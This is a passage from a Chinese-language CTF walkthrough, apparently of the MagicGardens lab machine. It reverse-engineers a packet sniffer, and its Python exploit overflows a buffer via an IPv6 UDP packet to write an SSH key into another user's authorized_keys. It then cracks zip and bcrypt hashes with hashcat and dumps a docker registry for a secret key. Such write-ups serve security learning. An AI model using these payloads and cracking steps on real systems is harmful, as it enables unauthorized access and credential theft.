[rbp-30h]</span></span><br><span class="line">  __int128 v8; <span class="comment">// [rsp+70h] [rbp-20h]</span></span><br><span class="line">  __int128 v9; <span class="comment">// [rsp+80h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">  read(a1, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  *(_OWORD *)s = <span class="number">0LL</span>;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0LL</span>;</span><br><span class="line">  v9 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(s, <span class="string">&quot;harvest v&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">strlen</span>(s);</span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;s[v2], a2);</span><br><span class="line">  *(_WORD *)&amp;s[<span class="built_in">strlen</span>(s)] = <span class="number">10</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, buf) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">strlen</span>(s);</span><br><span class="line">    write(a1, s, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] Successful handshake&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[x] Handshake error&quot;</span>);</span><br><span class="line">    write(a1, <span class="string">&quot;[x] Handshake error\n&quot;</span>, <span class="number">0x15</span>uLL);</span><br><span class="line">    close(a1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实重点的就下面这段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">  strcpy(s, &quot;harvest v&quot;);</span><br><span class="line">  v2 = strlen(s);</span><br><span class="line">  strcpy(&amp;s[v2], a2);</span><br><span class="line">  *(_WORD *)&amp;s[strlen(s)] = 10;</span><br><span class="line">  if ( !strcmp(s, buf) )</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
<p>要<code>buf</code>和<code>s</code>的值一致才可以，可以看到<code>s</code>一开始被赋值了<code>harvest v</code>，所以比较简单的方式还是发个包然后debug..</p>
<p><img src="/wpimages/2024/magicgardens/pwn1.jpg" alt="pwn1"></p>
<p>于是下个断点看看，我选在这里，因为看到他有给s最初的<code>harvest v</code>，所以跟着往下走走看cmp那会变成啥。</p>
<p><img src="/wpimages/2024/magicgardens/pwn2.jpg" alt="pwn2"></p>
<p>往下跟了跟到了strcmp，因为我用的客户端连接的嘛 所以这个部分就<code>1.0.3</code>肯定是客户端发过去的了，所以验证是指定能过得，所以我们要构造的发送包要带着harvest v1.0.3，以防万一再抓了个包看看</p>
<p><img src="/wpimages/2024/magicgardens/net1.jpg" alt="net1"></p>
<p>可以看到确实是发了个这个玩意</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo &#x27;harvest v1.0.3&#x27;|nc 127.0.0.1 1337</span><br><span class="line">harvest v1.0.3</span><br><span class="line">--------------------------------------------------</span><br><span class="line">Source: [00:0c:29:b9:eb:93]     [192.168.221.131]</span><br><span class="line">Dest:   [00:50:56:c0:00:08]     [192.168.221.1]</span><br><span class="line">Time:   [07:45:52]      Length: [86]</span><br></pre></td></tr></table></figure>

<p>朋友让用nc连接发包试试，确实行。</p>
<p><img src="/wpimages/2024/magicgardens/pwn3.jpg" alt="pwn3"></p>
<p>顺便看下下面的m会变成什么，断点下到这里好了</p>
<p><img src="/wpimages/2024/magicgardens/pwn4.jpg" alt="pwn4"></p>
<p>在经过几次循环后这里cmp时候就是一样的0x4了,然后就进了<code>handle_raw_packets</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">handle_raw_packets</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">10</span>]; <span class="comment">// [rsp+2Eh] [rbp-10072h] BYREF</span></span><br><span class="line">  <span class="type">time_t</span> timer; <span class="comment">// [rsp+38h] [rbp-10068h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v8[<span class="number">32</span>]; <span class="comment">// [rsp+40h] [rbp-10060h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9[<span class="number">32</span>]; <span class="comment">// [rsp+60h] [rbp-10040h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">14</span>]; <span class="comment">// [rsp+80h] [rbp-10020h] BYREF</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+8Eh] [rbp-10012h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+1008Ch] [rbp-14h]</span></span><br><span class="line">  __int16 *v13; <span class="comment">// [rsp+10090h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v14; <span class="comment">// [rsp+1009Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0xFFFF</span>uLL);</span><br><span class="line">  v14 = recvfrom(a1, s, <span class="number">0xFFFF</span>uLL, <span class="number">0</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  timer = time(<span class="number">0LL</span>);</span><br><span class="line">  v3 = ctime(&amp;timer);</span><br><span class="line">  <span class="built_in">strncpy</span>(dest, v3 + <span class="number">11</span>, <span class="number">8uLL</span>);</span><br><span class="line">  dest[<span class="number">8</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v14 &lt;= <span class="number">0x27</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Incomplete packet &quot;</span>);</span><br><span class="line">    close(a1);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v13 = &amp;v11;</span><br><span class="line">  v12 = <span class="number">255</span>;</span><br><span class="line">  <span class="built_in">sprintf</span>(</span><br><span class="line">    v9,</span><br><span class="line">    <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>,</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">6</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">7</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">8</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">9</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">10</span>],</span><br><span class="line">    (<span class="type">unsigned</span> __int8)s[<span class="number">11</span>]);</span><br><span class="line">  <span class="built_in">sprintf</span>(</span><br><span class="line">    v8,</span><br><span class="line">    <span class="string">&quot;%.2x:%.2x:%.2x:%.2x:%.2x:%.2x&quot;</span>,</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">0</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">1</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">2</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">3</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">4</span>],</span><br><span class="line">    v12 &amp; (<span class="type">unsigned</span> <span class="type">int</span>)s[<span class="number">5</span>]);</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v13 == <span class="number">69</span> )</span><br><span class="line">    print_packet((_DWORD)v13, a3, a2, (<span class="type">unsigned</span> <span class="type">int</span>)v9, (<span class="type">unsigned</span> <span class="type">int</span>)v8, (<span class="type">unsigned</span> <span class="type">int</span>)dest, (__int64)s);</span><br><span class="line">  result = *(<span class="type">unsigned</span> __int8 *)v13;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">96</span> )</span><br><span class="line">    <span class="keyword">return</span> log_packet(v13, a3);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/pwn5.jpg" alt="pwn5"></p>
<p>然后我就看见它进来给几个参申请了好大一段空间..</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">···</span><br><span class="line">  <span class="keyword">if</span> ( *(_BYTE *)v13 == <span class="number">0x45</span> )</span><br><span class="line">    print_packet((_DWORD)v13, a3, a2, (<span class="type">unsigned</span> <span class="type">int</span>)v9, (<span class="type">unsigned</span> <span class="type">int</span>)v8, (<span class="type">unsigned</span> <span class="type">int</span>)dest, (__int64)s);</span><br><span class="line">  result = *(<span class="type">unsigned</span> __int8 *)v13;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">0x60</span> )</span><br><span class="line">    <span class="keyword">return</span> log_packet(v13, a3);</span><br><span class="line">···</span><br></pre></td></tr></table></figure>

<p>这一段其实是判断包头信息，比如我这里用的是ipv4的地址连接，它的包头就会有69，比如</p>
<p><img src="/wpimages/2024/magicgardens/net2.jpg" alt="net2"></p>
<p>这个样子</p>
<p><img src="/wpimages/2024/magicgardens/net3.jpg" alt="net3"></p>
<p>这个是ipv6</p>
<p>其实这个溢出点就是对ipv6处理进入到这个log_packet里面发生的..</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">log_packet</span><span class="params">(__int64 a1, <span class="type">const</span> <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">uint16_t</span> v3; <span class="comment">// [rsp+1Eh] [rbp-FF82h]</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">65360</span>]; <span class="comment">// [rsp+20h] [rbp-FF80h] BYREF</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+FF70h] [rbp-30h] BYREF</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+FF98h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = htons(*(_WORD *)(a1 + <span class="number">4</span>));</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(dest, a2);  <span class="comment">//&lt;---这里溢出了 a2是我们传的，可以超大</span></span><br><span class="line">    <span class="built_in">strncpy</span>(format, (<span class="type">const</span> <span class="type">char</span> *)(a1 + <span class="number">60</span>), v3);</span><br><span class="line">    *(_WORD *)&amp;format[v3] = <span class="number">10</span>;</span><br><span class="line">    stream = fopen(dest, <span class="string">&quot;w&quot;</span>); <span class="comment">//&lt;---这里dest被写入了，可以溢出控制这里的文件名，甚至是内容</span></span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">fprintf</span>(stream, format);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;[!] Suspicious activity. Packages have been logged.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Bad log file&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>知道了溢出点就可以狠狠出击了，直接构造个大的发过去，需要注意得先让他进了监听模式再跑。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">└─$ cat v6v2.py </span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data=<span class="string">b&#x27;&#x27;</span>*<span class="number">65364</span> <span class="comment">#&lt;-样例 用gdb的或者msf的patten生成都ok 或者选自己喜欢的</span></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>

<p><img src="/wpimages/2024/magicgardens/pwn6.jpg" alt="pwn6"></p>
<p>这里在调用_IO_new_file_fopen的时候文件名就是被溢出冲掉了</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">_IO_new_file_fopen (</span><br><span class="line">   QWORD var_0 = <span class="number">0x000055555555a6d0</span> → <span class="number">0x00000005fbad248c</span>,</span><br><span class="line">   QWORD var_1 = <span class="number">0x00007ffffffed650</span> → <span class="string">&quot;Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw[...]&quot;</span>,</span><br><span class="line">   QWORD var_2 = <span class="number">0x00005555555579d1</span> → <span class="number">0x6f6c206461420077</span> (<span class="string">&quot;w&quot;</span>?),</span><br><span class="line">   <span class="type">int</span> var_3 = <span class="number">0x0000000000000001</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>变成了<code>Fu8Fu9Fv0Fv1Fv2Fv3Fv4Fv5Fv6Fv7Fv8Fv9Fw0Fw1Fw2Fw3Fw</code></p>
<p>我这里用的msf-pattern</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -q Fu8F -l 65501                              </span><br><span class="line">[*] Exact match at offset 4524</span><br><span class="line">[*] Exact match at offset 24804</span><br><span class="line">[*] Exact match at offset 45084</span><br><span class="line">[*] Exact match at offset 65364</span><br></pre></td></tr></table></figure>
<p>从65364开始排着往后试，看哪个部分是写文件名的。</p>
<p>好吧65364就是,但是很奇怪我是这么给的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,<span class="number">666</span>)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line"></span><br><span class="line">data=<span class="built_in">open</span>(<span class="string">&#x27;./list&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read().replace(<span class="string">b&#x27;\n&#x27;</span>,<span class="string">b&#x27;&#x27;</span>)+<span class="string">b&#x27;aaaaaaaaaaaaaaaa&#x27;</span></span><br><span class="line"></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">dir</span>                        </span><br><span class="line">aaaaaaaa</span><br></pre></td></tr></table></figure>

<p>list我里面写了65364个字符，然后又给了16个a，最后写出来的文件名是9个a，也就是被程序吞掉了7个,所以我要再给垃圾字符串+7个试试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf-pattern_create -l 65371 &gt; list</span><br></pre></td></tr></table></figure>

<p>然后再调用，就成了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ dir</span><br><span class="line">aaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>然后再看内容有没有被溢出影响到</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> aaaaaaaaaaaaaaa                                                                                                                     </span><br><span class="line">Aa4Aa5Aa6Aa7Aa....</span><br></pre></td></tr></table></figure>

<p>查下Aa4是多少位溢出的尝试写入</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">└─$ msf-pattern_offset -q Aa4A -l 65372                                  </span><br><span class="line">[*] Exact match at offset 12</span><br><span class="line">[*] Exact match at offset 20292</span><br><span class="line">[*] Exact match at offset 40572</span><br><span class="line">[*] Exact match at offset 60852</span><br></pre></td></tr></table></figure>

<p>这个就不用排着试了..</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">wc</span> aaaaaaaaaaaaaaa</span><br><span class="line">    0     1 65375 aaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure>

<p>65372+16-65375-1&#x3D;12 (因为wc会自动多计算一位所以-1)</p>
<p>所以最后可以控制写入文件名+文件内容就可以写公钥了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import socket</span><br><span class="line"></span><br><span class="line">server_address = (<span class="string">&#x27;::1&#x27;</span>,11111)</span><br><span class="line">s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM)</span><br><span class="line">s.connect(server_address)</span><br><span class="line">data=b<span class="string">&#x27;A&#x27;</span>*12+open(<span class="string">&#x27;./id_rsa.pub&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>()+open(<span class="string">&#x27;./list1&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).<span class="built_in">read</span>().replace(b<span class="string">&#x27;\n&#x27;</span>,b<span class="string">&#x27;&#x27;</span>)+b<span class="string">&#x27;/home/alex/.ssh/authorized_keys&#x27;</span></span><br><span class="line">s.send(data)</span><br></pre></td></tr></table></figure>
<p>这里要自己算一下公钥长度以决定垃圾数据长度，反正要先找到具体多少溢出可以写文件名然后减一下公钥长度就出来了。</p>
<p>然后到morty用户连一下server，再跑脚本就成功写入了。</p>
<p>再ssh登录到alex用户就ok</p>
<h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>这里我进来后跑了下linpeas其实..但是没翻到什么，其实我眼瞎了，一开始有邮件提示的，我是在linpeas跑到fail2ban找他漏洞时候看到有mail才想到顺便去看mail..</p>
<p>这里再&#x2F;var&#x2F;mail下有一个<code>alex</code>和一个<code>root</code></p>
<p>只能看alex，内容如下</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">alex@magicgardens:/var/mail$ <span class="built_in">cat</span> alex</span><br><span class="line">From root@magicgardens.magicgardens.htb  Fri Sep 29 09:31:49 2023</span><br><span class="line">Return-Path: &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line">X-Original-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Delivered-To: alex@magicgardens.magicgardens.htb</span><br><span class="line">Received: by magicgardens.magicgardens.htb (Postfix, from userid 0)</span><br><span class="line">        <span class="built_in">id</span> 3CDA93FC96; Fri, 29 Sep 2023 09:31:49 -0400 (EDT)</span><br><span class="line">MIME-Version: 1.0</span><br><span class="line">Content-Type: multipart/mixed; boundary=<span class="string">&quot;1804289383-1695994309=:37178&quot;</span></span><br><span class="line">Subject: Auth file <span class="keyword">for</span> docker</span><br><span class="line">To: &lt;alex@magicgardens.magicgardens.htb&gt;</span><br><span class="line">User-Agent: mail (GNU Mailutils 3.15)</span><br><span class="line">Date: Fri, 29 Sep 2023 09:31:49 -0400</span><br><span class="line">Message-Id: &lt;20230929133149.3CDA93FC96@magicgardens.magicgardens.htb&gt;</span><br><span class="line">From: root &lt;root@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: text/plain; charset=UTF-8</span><br><span class="line">Content-Disposition: inline</span><br><span class="line">Content-Transfer-Encoding: 8bit</span><br><span class="line">Content-ID: &lt;20230929093149.37178@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">Use this file <span class="keyword">for</span> registry configuration. The password is on your desk</span><br><span class="line"></span><br><span class="line">--1804289383-1695994309=:37178</span><br><span class="line">Content-Type: application/octet-stream; name=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Disposition: attachment; filename=<span class="string">&quot;auth.zip&quot;</span></span><br><span class="line">Content-Transfer-Encoding: <span class="built_in">base64</span></span><br><span class="line">Content-ID: &lt;20230929093149.37178.1@magicgardens.magicgardens.htb&gt;</span><br><span class="line"></span><br><span class="line">UEsDBAoACQAAAG6osFh0pjiyVAAAAEgAAAAIABwAaHRwYXNzd2RVVAkAA29KRmbOSkZmdXgLAAEE</span><br><span class="line">6AMAAAToAwAAVb+x1HWvt0ZpJDnunJUUZcvJr8530ikv39GM1hxULcFJfTLLNXgEW2TdUU3uZ44S</span><br><span class="line">q4L6Zcc7HmUA041ijjidMG9iSe0M/y1tf2zjMVg6Dbc1ASfJUEsHCHSmOLJUAAAASAAAAFBLAQIe</span><br><span class="line">AwoACQAAAG6osFh0pjiyVAAAAEgAAAAIABgAAAAAAAEAAACkgQAAAABodHBhc3N3ZFVUBQADb0pG</span><br><span class="line">ZnV4CwABBOgDAAAE6AMAAFBLBQYAAAAAAQABAE4AAACmAAAAAAA=</span><br><span class="line">--1804289383-1695994309=:37178--</span><br></pre></td></tr></table></figure>

<p>可以看到这就是包含了docker registry configuration登陆方式的一个压缩包,是root发过来的..当时我都快忘了还有5000了。</p>
<p>这里base64输出到zip，然后用zip2john导一下跑密码就ok</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ hashcat <span class="string">&#x27;$pkzip$1*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$&#x27;</span> -m 17225 /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">$pkzip<span class="variable">$1</span>*2*2*0*54*48*b238a674*0*42*0*54*a86e*55bfb1d475afb746692439ee9c951465cbc9afce77d2292fdfd18cd61c542dc1497d32cb3578045b64dd514dee678e12ab82fa65c73b1e6500d38d628e389d306f6249ed0cff2d6d7f6ce331583a0db7350127c9*$/pkzip$:realmadrid</span><br></pre></td></tr></table></figure>

<p>解压出来有个htpasswd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ <span class="built_in">cat</span> htpasswd</span><br><span class="line">AlexMiles:$2y$05<span class="variable">$KKShqNw</span>.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq</span><br></pre></td></tr></table></figure>

<p>接着跑</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat <span class="string">&#x27;$2y$05$KKShqNw.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq&#x27;</span> -m3200 /usr/share/wordlists/rockyou.txt --show</span><br><span class="line">$2y$05<span class="variable">$KKShqNw</span>.A66mmpEqmNJ0kuoBwO2rbdWetc7eXA7TbjhHZGs2Pa5Hq:diamonds</span><br></pre></td></tr></table></figure>

<p>然后拿着密码去看下5000里都有啥</p>
<blockquote>
<p>可以参考</p>
<p><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry">https://book.hacktricks.xyz/network-services-pentesting/5000-pentesting-docker-registry</a></p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ python3 drg.py -U AlexMiles -P diamonds https://magicgardens.htb --list</span><br><span class="line">[+] magicgardens.htb</span><br></pre></td></tr></table></figure>

<p>有个镜像 这个直接dump下来翻就行了，其实全部解压比较好，主要我硬盘没空间了，所以就挨个压缩包看了，有点折磨</p>
<p>然后在<code>480311b89e2d843d87e76ea44ffbb212643ba89c1e147f0d0ff800b5fe8964fb.tar.gz</code>压缩包里找到个app目录里面有.env，其中包含SECRET_KEY。</p>
<p>因为我之前做过python的web框架的反序列化的题目..所以看到SECRET_KEY一眼顶针，不过还是找了下salt，然后发现salt是默认的。</p>
<p>然后找利用脚本找了好久，朋友发过来一个才发现其实找到的第一个就是可以用的，是我的payload错了..在那疯狂touch &#x2F;tmp&#x2F;xxx，然后用alex去宿主机的&#x2F;tmp看有没有文件生成，忘了这是image目标是跑在docker里的，打昏头了属于是 XD</p>
<blockquote>
<p>这里用的这位师傅的脚本<strong><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-zhong/p/13463486.html">https://www.cnblogs.com/-zhong/p/13463486.html</a></strong></p>
</blockquote>
